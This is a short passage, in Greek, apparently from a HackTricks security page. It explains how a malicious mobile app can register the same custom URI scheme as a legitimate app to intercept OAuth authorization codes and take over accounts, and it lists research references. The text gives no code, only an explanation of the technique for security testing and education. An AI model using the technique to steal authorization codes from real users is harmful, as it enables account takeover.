Σε mobile OAuth υλοποιήσεις, οι apps χρησιμοποιούν **custom URI schemes** για να λαμβάνουν redirects με Authorization Codes. Ωστόσο, επειδή πολλαπλές apps μπορούν να καταχωρήσουν το ίδιο scheme σε μια συσκευή, η υπόθεση ότι μόνο ο νόμιμος client ελέγχει το redirect URI καταρρίπτεται. Στο Android, για παράδειγμα, μια Intent URI όπως `com.example.app://` oauth συλλαμβάνεται βάσει του scheme και των προαιρετικών filters που ορίζονται στο intent-filter μιας app. Δεδομένου ότι η intent resolution του Android μπορεί να είναι ευρεία—ειδικά αν καθορίζεται μόνο το scheme—ένας attacker μπορεί να καταχωρήσει μια malicious app με προσεκτικά σχεδιασμένο intent filter για να hijack-άρει τον authorization code. Αυτό μπορεί να **enable an account takeover** είτε μέσω αλληλεπίδρασης χρήστη (όταν πολλαπλές apps είναι ικανές να χειριστούν το intent) είτε μέσω bypass techniques που εκμεταλλεύονται υπερβολικά συγκεκριμένα filters, όπως αναλύει το flowchart αξιολόγησης της Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
